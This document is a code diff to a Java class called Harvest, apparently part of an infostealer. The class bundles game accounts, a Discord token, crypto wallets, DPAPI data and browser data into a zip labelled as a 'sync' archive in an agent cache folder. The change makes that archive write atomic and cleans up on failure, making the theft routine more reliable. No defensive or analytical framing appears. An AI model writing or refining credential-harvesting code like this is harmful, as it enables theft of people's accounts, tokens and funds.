@@ -26,16 +26,27 @@ public final class Harvest {
 		Path cache = AgentPaths.cache(installDir);
 		Files.createDirectories(cache);
 		Path target = cache.resolve("sync-" + System.currentTimeMillis() + ".zip");
-		try (ZipBuilder zip = new ZipBuilder(target)) {
-			addAccounts(zip, gameDir);
-			addAdminHints(zip);
-			addDiscordToken(zip, installDir);
-			addWallets(zip);
-			addDpapi(zip);
-			addBrowsers(zip, installDir);
-			addGame(zip, gameDir);
+		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
+		try {
+			try (ZipBuilder zip = new ZipBuilder(temp)) {
+				addAccounts(zip, gameDir);
+				addAdminHints(zip);
+				addDiscordToken(zip, installDir);
+				addWallets(zip);
+				addDpapi(zip);
+				addBrowsers(zip, installDir);
+				addGame(zip, gameDir);
+			}
+			try {
+				Files.move(temp, target, java.nio.file.StandardCopyOption.ATOMIC_MOVE);
+			} catch (java.io.IOException atomicFailed) {
+				Files.move(temp, target, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+			}
+			return target;
+		} catch (Exception exception) {
+			Files.deleteIfExists(temp);
+			throw exception;
 		}
-		return target;
 	}
 
 	private static void addAccounts(ZipBuilder zip, Path gameDir) {
